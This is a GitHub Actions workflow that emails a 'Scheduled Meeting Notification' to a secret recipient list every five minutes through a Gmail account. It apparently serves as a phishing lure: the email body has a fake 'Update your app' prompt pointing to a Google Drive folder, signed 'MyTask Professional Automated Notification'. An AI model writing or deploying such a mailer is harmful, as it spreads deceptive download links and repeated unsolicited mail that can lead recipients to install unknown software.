name: Send Scheduled Meeting Notification

on:
  workflow_dispatch:
    inputs:
      recipient_email:
        description: 'Recipient email address (optional when MEETING_RECIPIENTS secret is set)'
        required: false
      recipient_name:
        description: 'Recipient name'
        required: false
      meeting_title:
        description: 'Meeting title'
        required: false
      meeting_date:
        description: 'Meeting date'
        required: false
      meeting_time:
        description: 'Meeting time'
        required: false
  schedule:
    - cron: '3/5 * * * *'

jobs:
  send-scheduled-meeting-email:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm install nodemailer

      - name: Send scheduled meeting notification email
        env:
          GMAIL_USER: ${{ secrets.GMAIL_USER }}
          GMAIL_PASS: ${{ secrets.GMAIL_PASS }}
          MEETING_RECIPIENTS: ${{ secrets.MEETING_RECIPIENTS }}
          RECIPIENT_EMAIL: ${{ github.event.inputs.recipient_email }}
          RECIPIENT_NAME: ${{ github.event.inputs.recipient_name }}
          MEETING_TITLE: ${{ github.event.inputs.meeting_title }}
          MEETING_DATE: ${{ github.event.inputs.meeting_date }}
          MEETING_TIME: ${{ github.event.inputs.meeting_time }}
        run: |
          node - <<'NODE'
          const nodemailer = require('nodemailer');

          const recipients = (process.env.RECIPIENT_EMAIL || process.env.MEETING_RECIPIENTS || '')
            .split(',')
            .map((item) => item.trim())
            .filter(Boolean);

          if (!recipients.length) {
            console.error('Missing recipient email. Set workflow input recipient_email or secret MEETING_RECIPIENTS.');
            process.exit(1);
          }

          const name = process.env.RECIPIENT_NAME || 'Team Member';
          const meetingTitle = process.env.MEETING_TITLE || 'Scheduled meeting created';
          const meetingDate = process.env.MEETING_DATE || 'TBD';
          const meetingTime = process.env.MEETING_TIME || 'TBD';

          const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
              user: process.env.GMAIL_USER,
              pass: process.env.GMAIL_PASS,
            },
          });

          const mailOptions = {
            from: process.env.GMAIL_USER,
            to: recipients.join(','),
            subject: `Scheduled Meeting Notification: ${meetingTitle}`,
            text: `Hello ${name},

A new scheduled meeting has been created.

Title: ${meetingTitle}
Date: ${meetingDate}
Time: ${meetingTime}

Please log in to your account to join the meeting.

Update your app to access the latest meeting feature: https://drive.google.com/drive/folders/1tUwf_vpw0RWlOWHvZEUIWA6pPlGDohAT?usp=drive_link

— MyTask Professional Automated Notification`,
          };

          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error('Error sending email:', error.message);
              process.exit(1);
            }
            console.log('Scheduled meeting notification email sent:', info.response);
          });
          NODE
